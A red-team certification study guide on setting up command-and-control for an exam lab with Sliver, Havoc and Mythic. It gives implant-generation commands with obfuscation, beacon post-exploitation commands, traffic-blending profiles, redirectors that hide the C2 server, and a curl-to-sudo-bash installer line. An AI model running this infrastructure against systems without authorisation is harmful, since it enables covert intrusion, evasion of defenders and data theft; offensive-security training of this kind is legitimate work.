# Phase 01: C2 Setup & Red Team Infrastructure

> **Exam priority: CRITICAL.** You deploy C2 from scratch on exam day. If you can't do this in 20 minutes, practice until you can.

---

## C2 Framework Choices for CRTeamer

| Framework | License | Setup time | Defender evasion | Recommendation |
|-----------|---------|-----------|-----------------|----------------|
| **Sliver** | Free/OSS | 5 min | Good (needs custom stagers) | Best free option |
| **Havoc** | Free/OSS | 8 min | Good (modular) | Good alternative |
| **Mythic** | Free/OSS | 10 min (Docker) | Agent-dependent | Flexible, complex setup |
| **Metasploit** | Free | 2 min | Poor (heavily signatured) | Only for initial testing |
| **Cobalt Strike** | Paid (~$500) | 5 min | Excellent | Best if you have a license |

**Recommendation for most candidates**: Sliver for the exam. Fast setup, free, good evasion with custom profiles.

---

## 1. Sliver — Full Exam Setup

### Install
```bash
# One-liner install
curl https://sliver.sh/install | sudo bash
# Or: download binary from GitHub releases
wget https://github.com/BishopFox/sliver/releases/latest/download/sliver-server_linux -O /usr/local/bin/sliver-server
chmod +x /usr/local/bin/sliver-server
```

### Start server + client
```bash
# Terminal 1 — start server
sudo sliver-server

# Terminal 2 — connect client (or use multiplayer)
sliver-client
```

### Create listeners
```bash
# HTTPS listener (preferred — blends with web traffic)
sliver > https --lhost 0.0.0.0 --lport 443

# HTTP listener (backup)
sliver > http --lhost 0.0.0.0 --lport 80

# mTLS (most stable for internal pivoting)
sliver > mtls --lhost 0.0.0.0 --lport 8888
```

### Generate implants
```bash
# Stageless EXE (simplest for initial testing)
sliver > generate --http https://<YOUR_IP> --os windows --arch amd64 --save /tmp/beacon.exe

# Shellcode (for injection / reflective load)
sliver > generate --http https://<YOUR_IP> --os windows --arch amd64 --format shellcode --save /tmp/beacon.bin

# DLL (for DLL hijack delivery)
sliver > generate --http https://<YOUR_IP> --os windows --arch amd64 --format shared --save /tmp/beacon.dll

# With evasion (skip symbols, obfuscate strings)
sliver > generate --http https://<YOUR_IP> --os windows --arch amd64 \
  --skip-symbols --obfuscate --save /tmp/beacon_evasive.exe
```

### Post-exploitation (once beacon is up)
```bash
sliver (beacon) > info                    # session info
sliver (beacon) > shell                   # interactive shell
sliver (beacon) > execute-assembly /local/path/SharpHound.exe -c All --zip
sliver (beacon) > upload /local/file.exe C:\\Windows\\Temp\\file.exe
sliver (beacon) > download C:\\Users\\user\\flag.txt /tmp/
sliver (beacon) > socks5 start           # SOCKS5 proxy for pivoting
sliver (beacon) > portfwd add -r <target_ip>:<port>
```

---

## 2. Havoc — Alternative Setup

```bash
# Clone and build
git clone https://github.com/HavocFramework/Havoc
cd Havoc && make
cd teamserver && go build .

# Start team server
./teamserver server --profile profiles/havoc.yaotl

# Connect client (separate terminal)
cd client && ./Havoc
```

### Generate payload (Havoc GUI)
- Listeners → Add: HTTPS, port 443
- Payloads → Windows Shellcode or EXE
- Demon options: Sleep 5s, Jitter 20%, indirect syscalls ON

---

## 3. Mythic (Docker-based)

```bash
# Install
git clone https://github.com/its-a-feature/Mythic
cd Mythic && sudo ./install_docker_ubuntu.sh
sudo make

# Start
sudo mythic-cli start

# Access UI: https://localhost:7443
# Default creds in .env file

# Install agents (example: Apollo for Windows)
sudo mythic-cli install github https://github.com/MythicAgents/Apollo
sudo mythic-cli install github https://github.com/MythicC2Profiles/http
```

---

## 4. Redirectors (OPSEC Layer)

A redirector sits between the victim and your C2 — if the victim's defenders follow the beacon back, they find the redirector, not your real server.

```
[victim] → [redirector:443] → [C2 server:443]
```

### Simple socat redirector
```bash
# On VPS / redirector host
sudo socat TCP-LISTEN:443,fork TCP:<C2_SERVER_IP>:443
```

### Apache mod_rewrite redirector
```bash
# /etc/apache2/sites-available/redirector.conf
<VirtualHost *:443>
    SSLEngine on
    SSLCertificateFile /etc/ssl/certs/ssl-cert-snakeoil.pem
    SSLCertificateKeyFile /etc/ssl/private/ssl-cert-snakeoil.key

    RewriteEngine On
    # Only relay known C2 URIs — everything else returns 404
    RewriteCond %{REQUEST_URI} ^/legit-path/
    RewriteRule ^(.*)$ https://<C2_IP>$1 [P]
    RewriteRule ^ - [F]
</VirtualHost>
```

**Note for exam**: The exam likely doesn't require a redirector (you're on the same VPN network). Focus on a stable C2 connection first — add redirector complexity only in real engagements.

---

## 5. C2 Profiles & Traffic Blending

Default C2 traffic is heavily signatured. Customize the HTTP profile to look like legitimate traffic:

### Sliver HTTP profile customization
```bash
# Edit implant profile to use realistic headers
sliver > generate --http https://<IP> \
  --http-c2 /path/to/custom-profile.json \
  --os windows --arch amd64
```

Custom profile snippet (make traffic look like browser requests):
```json
{
  "implant_config": {
    "connection_strategy": "random",
    "poll_jitter": 30,
    "poll_interval": 5
  },
  "get_implantsegments": [
    {
      "uri": ["/api/v1/health", "/cdn/assets/main.js", "/static/img/logo.png"]
    }
  ],
  "headers": [
    {"name": "User-Agent", "value": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"},
    {"name": "Accept", "value": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"}
  ]
}
```

---

## 6. Confirm Your Setup Works (Pre-Exam Drill)

Run this drill on a fresh Kali VM. Target: complete in 20 minutes.

```
Minute 0  : Fresh Kali started, VPN connected
Minute 2  : Install Sliver (or have binary ready)
Minute 5  : Start server + create HTTPS listener
Minute 8  : Generate stageless EXE implant
Minute 10 : Transfer implant to a test Windows VM
Minute 12 : Execute → confirm beacon in Sliver client
Minute 15 : Run execute-assembly with SharpHound test
Minute 18 : Confirm SOCKS5 proxy works
Minute 20 : ✅ Ready for exam
```

If any step takes longer than 5 minutes, drill that specific step until it's automatic.

---

## Exam-Day Tips

- **Write your C2 IP on paper** before starting — you'll type it 20+ times
- **Generate multiple implant formats** immediately: EXE, shellcode, DLL — don't wait until you know what delivery you'll need
- **Test your beacon on a Windows test box before exam** — if Defender catches it, you have time to fix your evasion
- **Keep the C2 terminal visible** — nothing worse than a session timing out while you're enumerating
- **Set a long sleep timer initially** (15s) — quieter in case there's detection; reduce later if you need speed

---

## Next Step

→ You have C2. Now build payloads that bypass Defender: **Phase 02: Payload Development & Evasion** (`02-payload-evasion.md`)
